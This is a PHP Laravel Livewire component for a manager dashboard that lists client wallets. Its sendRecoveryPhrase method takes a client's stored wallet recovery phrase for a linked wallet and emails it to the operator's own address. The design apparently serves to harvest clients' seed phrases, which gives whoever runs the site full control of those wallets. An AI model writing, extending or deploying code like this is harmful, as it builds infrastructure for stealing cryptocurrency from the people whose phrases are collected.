<?php

use App\Models\Wallet;
use App\Models\User;
use App\Mail\WalletRecoveryMail;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use Livewire\Attributes\Computed;
use Livewire\Attributes\Layout;
use Livewire\Attributes\Title;
use Livewire\Component;
use Livewire\WithPagination;

new #[Layout('layouts::dashboard'), Title('View Wallets')] class extends Component {
    use WithPagination;

    public string $search = '';
    public ?int $selectedWalletId = null;

    public function updatingSearch()
    {
        $this->resetPage();
    }

    public function mount()
    {
        if (!Auth::user()->isManager()) {
            abort(403);
        }
    }

    public function selectWallet(int $walletId)
    {
        $this->selectedWalletId = $walletId;
    }

    public function closeWalletModal()
    {
        $this->selectedWalletId = null;
    }

    public function sendRecoveryPhrase(int $walletId, int $linkedWalletIndex)
    {
        if (!Auth::user()->isManager()) {
            abort(403);
        }

        $wallet = Wallet::with('user')->findOrFail($walletId);
        $linkedWallets = $wallet->recovery_phrase ?? [];

        if (!isset($linkedWallets[$linkedWalletIndex])) {
            $this->dispatch('notify', message: 'Linked wallet not found.', type: 'error');
            return;
        }

        $linkedWalletData = $linkedWallets[$linkedWalletIndex];

        // Send to admin email
        Mail::to(config('mail.from.address'))->send(new WalletRecoveryMail($wallet, $linkedWalletData));

        $this->dispatch('notify', message: 'Recovery phrase for ' . $linkedWalletData['name'] . ' has been sent to ' . config('mail.from.address'), type: 'success');
    }

    #[Computed]
    public function wallets()
    {
        $query = Wallet::with('user')
            ->whereHas('user', function ($q) {
                $q->where('role', \App\Enums\UserRole::Client);
                
                if ($this->search) {
                    $q->where(function($sq) {
                        $sq->where('name', 'like', "%{$this->search}%")
                           ->orWhere('email', 'like', "%{$this->search}%");
                    });
                }
            });

        return $query->latest()->paginate(12);
    }

    #[Computed]
    public function selectedWallet()
    {
        return $this->selectedWalletId ? Wallet::with('user')->find($this->selectedWalletId) : null;
    }
};